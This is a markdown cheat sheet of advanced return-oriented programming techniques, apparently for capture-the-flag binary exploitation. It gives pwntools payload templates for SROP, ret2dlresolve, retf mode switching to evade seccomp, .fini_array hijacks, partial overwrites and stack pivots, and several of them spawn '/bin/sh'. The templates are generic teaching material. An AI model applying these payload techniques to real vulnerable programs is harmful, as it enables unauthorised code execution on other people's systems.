# Advanced ROP Techniques

## SROP (Sigreturn-Oriented Programming)

**When**: Need full register control but limited gadgets.

**How**: The `sigreturn` syscall restores all registers from a
signal frame on the stack. Forge a fake signal frame to set
every register to desired values.

```python
from pwn import *

frame = SigreturnFrame()
frame.rax = 59           # execve
frame.rdi = binsh_addr   # "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret  # address of 'syscall; ret'
frame.rsp = stack_addr   # new stack pointer

payload = b'A' * offset
payload += p64(pop_rax_ret)
payload += p64(15)        # sigreturn syscall number
payload += p64(syscall_ret)
payload += bytes(frame)
```

**Advantage**: Only need `pop rax; ret` and `syscall; ret` — two
gadgets give full register control.

## ret2dlresolve

**When**: PIE is off, no libc leak available, Partial RELRO.

**How**: Forge fake ELF structures (Elf_Sym, Elf_Rel, string table
entry) on the stack or BSS to trick the dynamic linker into
resolving an arbitrary function (e.g., `system`).

```python
from pwn import *

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

p.sendline(b'A' * offset + rop.chain())
p.send(dlresolve.payload)
```

**Pwntools** handles the structure forging automatically via
`Ret2dlresolvePayload`.

## RETF (Return Far) Architecture Switch

**When**: 64-bit binary but you need 32-bit syscalls (e.g., to
use `int 0x80` for different syscall numbers).

**How**: `retf` pops RIP and CS from the stack. Setting CS=0x23
switches to 32-bit mode, CS=0x33 returns to 64-bit.

```python
# Switch to 32-bit mode
payload += p64(retf_gadget)
payload += p32(shellcode_32bit_addr)  # 32-bit EIP
payload += p32(0x23)                   # 32-bit CS

# After 32-bit work, switch back to 64-bit
# retf with CS=0x33
```

**Use case**: Bypass seccomp filters that only check 64-bit
syscall numbers. 32-bit `int 0x80` uses different numbers
(e.g., `read` is 3 in 32-bit, 0 in 64-bit).

## .fini_array Hijack

**When**: You can write to `.fini_array` (Partial RELRO, writable
.fini_array section).

**How**: Functions in `.fini_array` are called in reverse order
at program exit. Overwrite an entry to redirect execution.

```python
# Write target address to .fini_array
# If main is at elf.sym['main'], write it there for infinite loop:
fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
# Overwrite fini_array entry → called on exit() or return from main
```

## Partial Overwrite

**When**: PIE is on but you can overwrite only the low bytes of
a return address (1-2 bytes).

**How**: The low 12 bits of an address are fixed (page offset).
Overwrite the low 12 bits to redirect to a different function
within the same page, or overwrite 16 bits with 4-bit brute-force
(1/16 chance).

```python
# Overwrite low 2 bytes of return address
# Original return: 0x5555555551XX
# Target:          0x5555555552YY
# Only need to change last 2 bytes: 52 YY
payload = b'A' * offset + p16(target_low_bytes)
# May need to brute-force the 4 unknown bits (1/16 success rate)
```

## ret2vDSO

**When**: Need gadgets but binary is minimal. The vDSO (virtual
dynamic shared object) is mapped into every Linux process and
contains useful gadgets.

```python
# Leak vDSO address from auxiliary vector or /proc/self/maps
# Then use gadgets from vDSO
```

## Double Pivot / Multi-Stage

**When**: Controlled buffer is small. Pivot to a first-stage
buffer, use it to read a larger second-stage payload.

```python
# Stage 1: pivot to small controlled area, call read() to load stage 2
# Stage 2: full ROP chain in the newly-read buffer
rop1 = ROP(elf)
rop1.read(0, bss_addr, 0x1000)      # read stage 2 to BSS
rop1.raw(bss_addr)                   # pivot to BSS (via leave;ret or direct)
payload1 = b'A' * offset + p64(bss_addr - 8) + p64(leave_ret)
```
